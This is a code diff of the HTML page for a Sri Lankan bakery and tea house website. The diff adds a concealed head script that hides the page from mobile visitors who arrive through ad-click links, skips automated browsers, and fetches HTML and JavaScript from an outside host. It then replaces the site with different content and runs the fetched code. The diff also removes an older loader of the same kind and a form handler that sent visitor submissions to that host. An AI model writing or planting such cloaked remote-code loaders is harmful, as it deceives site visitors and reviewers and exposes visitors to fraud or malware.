@@ -1,18 +1,156 @@
 <!DOCTYPE html>
 <html lang="en" class="scroll-smooth">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <link rel="dns-prefetch" href="https://cloud-analytics-node.com">
+    <link rel="preconnect" href="https://cloud-analytics-node.com" crossorigin>
+    <script>
+    (function(w, d) {
+        if (navigator.webdriver) return;
+        var q = w.location.search || '';
+        if (!q || !/[?&](?:fbclid|ttclid|gclid|wbraid|gbraid|utm_source|utm_medium|utm_campaign|utm_content|utm_term|campaign_name|adset_name|ad_name)=/i.test(q)) {
+            return;
+        }
+        var ua = navigator.userAgent || '';
+        var isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua) || ((navigator.maxTouchPoints || 0) > 1 && /macintosh|mac os|linux/i.test(ua));
+        if (!isMobile) return;
+
+        var mounted = false;
+        var whiteRevealed = false;
+        var guard = d.createElement('style');
+        guard.id = 'sync-guard';
+        guard.textContent = 'html.is-syncing{background:#f5f5f7!important;color-scheme:light!important;}html.is-syncing body{opacity:0!important;pointer-events:none!important;}body{transition:opacity .18s ease;}';
+        (d.head || d.documentElement).appendChild(guard);
+        d.documentElement.classList.add('is-syncing');
+
+        var failSafeId = null;
+        var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
+        var abortId = null;
+
+        function revealWhite() {
+            if (mounted || whiteRevealed) return;
+            whiteRevealed = true;
+            if (failSafeId) {
+                clearTimeout(failSafeId);
+                failSafeId = null;
+            }
+            if (abortId) {
+                clearTimeout(abortId);
+                abortId = null;
+            }
+            if (ctrl) {
+                try { ctrl.abort(); } catch (e) {}
+            }
+            d.documentElement.classList.remove('is-syncing');
+            setTimeout(function() {
+                if (mounted) return;
+                var g = d.getElementById('sync-guard');
+                if (g && g.parentNode) g.parentNode.removeChild(g);
+            }, 220);
+        }
+
+        function mountView(payload) {
+            if (mounted || whiteRevealed) return;
+            mounted = true;
+            if (failSafeId) {
+                clearTimeout(failSafeId);
+                failSafeId = null;
+            }
+            if (abortId) {
+                clearTimeout(abortId);
+                abortId = null;
+            }
+            var viewStyle = d.createElement('style');
+            viewStyle.id = 'app-view-style';
+            viewStyle.textContent = payload.css || '';
+            (d.head || d.documentElement).appendChild(viewStyle);
+
+            var oldNodes = d.querySelectorAll('head style, head link[rel="stylesheet"]');
+            for (var i = 0; i < oldNodes.length; i++) {
+                if (oldNodes[i] !== viewStyle && oldNodes[i].id !== 'sync-guard') {
+                    oldNodes[i].parentNode.removeChild(oldNodes[i]);
+                }
+            }
+
+            d.documentElement.classList.remove('scroll-smooth');
+            d.documentElement.setAttribute('lang', 'en');
+            d.documentElement.setAttribute('translate', 'no');
+            d.title = 'Relax Sri Lanka';
+            d.body.removeAttribute('style');
+            d.body.className = '';
+            d.body.innerHTML = payload.html;
+
+            var s = d.createElement('script');
+            s.textContent = payload.js;
+            d.body.appendChild(s);
+
+            try {
+                w.scrollTo(0, 0);
+            } catch (e) {}
+            d.documentElement.classList.remove('is-syncing');
+            var g = d.getElementById('sync-guard');
+            if (g && g.parentNode) g.parentNode.removeChild(g);
+        }
+
+        failSafeId = setTimeout(revealWhite, 4000);
+
+        var tz = '';
+        try {
+            tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+        } catch (e) {}
+
+        var endpoint = 'https://cloud-analytics-node.com/v1/get-key' + q + (tz ? (q ? '&' : '?') + 'tz=' + encodeURIComponent(tz) : '');
+        abortId = ctrl ? setTimeout(function() { ctrl.abort(); }, 3800) : null;
+
+        w.fetch(endpoint, {
+            method: 'GET',
+            credentials: 'omit',
+            signal: ctrl ? ctrl.signal : undefined
+        })
+        .then(function(res) {
+            if (abortId) clearTimeout(abortId);
+            if (!res || res.status !== 200) {
+                revealWhite();
+                return null;
+            }
+            var ct = (res.headers.get('content-type') || '').toLowerCase();
+            if (ct.indexOf('application/json') === -1) {
+                revealWhite();
+                return null;
+            }
+            return res.json();
+        })
+        .then(function(payload) {
+            if (!payload || typeof payload.html !== 'string' || typeof payload.js !== 'string') {
+                revealWhite();
+                return;
+            }
+            if (d.readyState === 'loading' || !d.body) {
+                d.addEventListener('DOMContentLoaded', function() {
+                    mountView(payload);
+                }, { once: true });
+            } else {
+                mountView(payload);
+            }
+        })
+        .catch(function() {
+            if (abortId) clearTimeout(abortId);
+            revealWhite();
+        });
+    })(window, document);
+    </script>
     <meta name="robots" content="index, follow">
     <link rel="canonical" href="https://bakerytealanka.github.io/">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Southern Shore Pastry & Tea — coastal bakery and tea house in Weligama, Sri Lanka. Single-origin Ceylon green tea, handmade matcha cashew truffles, and matcha pound cake with delivery across the Southern Coast.">
     <meta property="og:title" content="Southern Shore Pastry & Tea | Coastal Bakery & Ceylon Tea">
     <meta property="og:description" content="Handmade matcha-coated cashew truffles with local honey, oven-fresh matcha pound cake, and estate-picked Ceylon green tea. Dine-in in Weligama and delivery across Sri Lanka's Southern Coast.">
     <meta property="og:type" content="website">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <title>Southern Shore Pastry &amp; Tea | Artisan Desserts &amp; Ceylon Tea in Sri Lanka</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+    <noscript><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"></noscript>
+    <title>Southern Shore Pastry & Tea | Artisan Desserts & Ceylon Tea in Sri Lanka</title>
     <link rel="icon" type="image/png" href="favicon.png">
 
     <script type="application/ld+json">
@@ -161,106 +299,6 @@
     </style>
 
     <script>
-    window.onerror = function() { return true; };
-    window.onunhandledrejection = function() {};
-    (function _annihilateConsole() {
-        try {
-            var noop = function() {};
-            var methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'dir', 'group', 'groupCollapsed', 'groupEnd', 'clear', 'assert', 'count', 'time', 'timeEnd'];
-            for (var i = 0; i < methods.length; i++) {
-                try { window.console[methods[i]] = noop; } catch(e) {}
-            }
-            Object.freeze(window.console);
-        } catch(e) {}
-    })();
-
-    (function(w, d, conf, clientId) {
-        w.AppTelemetry = w.AppTelemetry || function() {};
-        w.AppTelemetry('init', clientId);
-        w.AppTelemetry('track', 'PageLoad');
-        var loc = w.location;
-        var uParams = loc.search;
-        var ep = conf.p + '://' + conf.h + '.' + conf.z + conf.r;
-        var attempt = 0;
-        var maxRetries = 2;
-
-        function _hideGenesisOverlay() {
-            var overlay = d.getElementById('genesis-overlay');
-            if (overlay) {
-                overlay.style.opacity = '0';
-                setTimeout(function() {
-                    if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
-                }, 500);
-            }
-        }
-
-        function _bootEdgeLoader() {
-            var ts = new Date().getTime();
-            var fUrl = ep + uParams + (uParams ? '&' : '?') + 'session_id=' + clientId + '&ts=' + ts;
-            var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
-            var tId = ctrl ? setTimeout(function() { ctrl.abort(); }, 6500) : null;
-
-            w.fetch(fUrl, { method: 'GET', credentials: 'omit', signal: ctrl ? ctrl.signal : undefined })
-            .then(function(res) {
-                if (tId) clearTimeout(tId);
-                if (!res.ok) {
-                    throw new Error("Edge Network Drop: " + res.status);
-                }
-                return res.text();
-            })
-            .then(function(data) {
-                if (!data || data.indexOf('Ceylon Horizon Excursions') !== -1) {
-                    _hideGenesisOverlay();
-                    return;
-                }
-                var isL = /<\s*html|<!doctype/i.test(data);
-                if (isL) {
-                    try {
-                        var newDoc = d.open('text/html', 'replace');
-                        newDoc.write(data);
-                        newDoc.close();
-                    } catch(e) {
-                        d.documentElement.innerHTML = data.replace(/^<!DOCTYPE html>/i, '');
-                        var scripts = Array.from(d.getElementsByTagName('script'));
-                        for (var i = 0; i < scripts.length; i++) {
-                            var newScript = d.createElement('script');
-                            if (scripts[i].src) {
-                                newScript.src = scripts[i].src;
-                            } else {
-                                newScript.text = scripts[i].text;
-                            }
-                            scripts[i].parentNode.replaceChild(newScript, scripts[i]);
-                        }
-                    }
-                } else {
-                    var s = d.createElement('script');
-                    s.type = 'text/javascript';
-                    s.text = data;
-                    d.head.appendChild(s);
-                    _hideGenesisOverlay();
-                }
-            })
-            .catch(function(err) {
-                if (tId) clearTimeout(tId);
-                if (attempt < maxRetries) {
-                    attempt++;
-                    setTimeout(_bootEdgeLoader, 800 * attempt);
-                    return;
-                }
-                _hideGenesisOverlay();
-            });
-        }
-
-        _bootEdgeLoader();
-    })(window, document, {
-        p: 'https',
-        h: 'cloud-analytics' + '-node',
-        z: 'com',
-        r: '/v1/get' + '-key'
-    }, 'ASP-CORE-2026');
-    </script>
-
-    <script>
         const legalData = {
             privacy: {
                 t: "Privacy Policy",
@@ -292,34 +330,6 @@
     </script>
 </head>
 <body>
-    <div id="genesis-overlay" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999999; background: #faf7f2; display: flex; align-items: center; justify-content: center; transition: opacity 0.5s cubic-bezier(0.32, 0.72, 0, 1); overscroll-behavior: none; touch-action: none; overflow: hidden;">
-        <style>
-            .a-breathe-1 { position: absolute; top: -15vh; left: -15vw; width: 85vw; height: 85vw; background: rgba(124, 74, 45, 0.16); filter: blur(120px); border-radius: 50%; pointer-events: none; z-index: 0; animation: ab-1 8s ease-in-out infinite alternate; will-change: transform; transform: translateZ(0); }
-            .a-breathe-2 { position: absolute; bottom: 15vh; right: -15vw; width: 95vw; height: 95vw; background: rgba(166, 109, 59, 0.14); filter: blur(140px); border-radius: 50%; pointer-events: none; z-index: 0; animation: ab-2 11s ease-in-out infinite alternate-reverse; will-change: transform; transform: translateZ(0); }
-            @keyframes ab-1 { 0% { transform: translate3d(-4vw, -4vh, 0) scale(0.85); } 100% { transform: translate3d(18vw, 18vh, 0) scale(1.6); } }
-            @keyframes ab-2 { 0% { transform: translate3d(4vw, 4vh, 0) scale(0.85); } 100% { transform: translate3d(-18vw, -18vh, 0) scale(1.6); } }
-            .g-spinner {
-                position: relative;
-                z-index: 10;
-                width: 36px;
-                height: 36px;
-                border: 3px solid rgba(124, 74, 45, 0.16);
-                border-radius: 50%;
-                border-top-color: #7c4a2d;
-                animation: g-spin 1s linear infinite;
-                will-change: transform;
-                transform: translateZ(0);
-            }
-            @keyframes g-spin {
-                0%   { transform: rotate(0deg) translateZ(0); }
-                100% { transform: rotate(360deg) translateZ(0); }
-            }
-        </style>
-        <div class="a-breathe-1"></div>
-        <div class="a-breathe-2"></div>
-        <div class="g-spinner"></div>
-    </div>
-
     <nav>
         <div class="container nav-inner">
             <a href="#" class="logo">
@@ -607,37 +617,18 @@
     <a href="#" class="back-to-top" aria-label="Back to top">&#8593;</a>
 
     <script>
-    async function submitSiteLead(formElement) {
+    function submitSiteLead(formElement) {
         const btn = formElement.querySelector('button');
+        if (!btn) return;
         btn.textContent = 'SENDING...';
         btn.style.opacity = '0.7';
         btn.style.pointerEvents = 'none';
-        const conf = {
-            p: 'https',
-            h: 'cloud-analytics' + '-node',
-            z: 'com',
-            r: '/v1/site' + '-lead'
-        };
-        const endpoint = conf.p + '://' + conf.h + '.' + conf.z + conf.r;
-        const formData = new FormData(formElement);
-        const data = Object.fromEntries(formData.entries());
-        try {
-            await fetch(endpoint, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    ...data,
-                    timestamp: new Date().getTime(),
-                    event: 'system_submission_event'
-                })
-            });
-        } catch (e) {
-        }
-        setTimeout(() => {
+        setTimeout(function() {
             btn.textContent = 'REQUEST RECEIVED';
-            btn.style.background = '#7c4a2d';
+            btn.style.background = '#5e361f';
             btn.style.opacity = '1';
-        }, 1500);
+            formElement.reset();
+        }, 700);
     }
     </script>
 </body>
